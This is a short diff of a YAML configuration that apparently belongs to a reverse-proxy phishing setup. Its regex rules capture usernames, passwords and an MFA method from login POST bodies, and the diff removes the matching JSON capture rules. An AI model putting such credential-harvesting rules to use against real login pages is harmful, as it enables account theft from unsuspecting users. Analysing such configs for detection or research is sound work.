@@ -30,19 +30,13 @@ auth_urls:
   - "/favicon.ico"
 credentials:
   username:
-    - key: '(login|UserName|username|email|account)'
-      search: '(.*)'
-      type: 'post'
-    - key: '"username":"([^"]*)'
-      search: '(.*)'
-      type: 'json'
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+    type: 'post'
   password:
-    - key: '(passwd|Password|accesspass|password|login_password|pass|pwd|session_password|PASSWORD)'
-      search: '(.*)'
-      type: 'post'
-    - key: '"password":"([^"]*)'
-      search: '(.*)'
-      type: 'json'
+    key: '(passwd|Password|accesspass|password|login_password|pass|pwd|session_password|PASSWORD)'
+    search: '(.*)'
+    type: 'post'
   custom:
     - key: 'mfaAuthMethod'
       search: '(.*)'
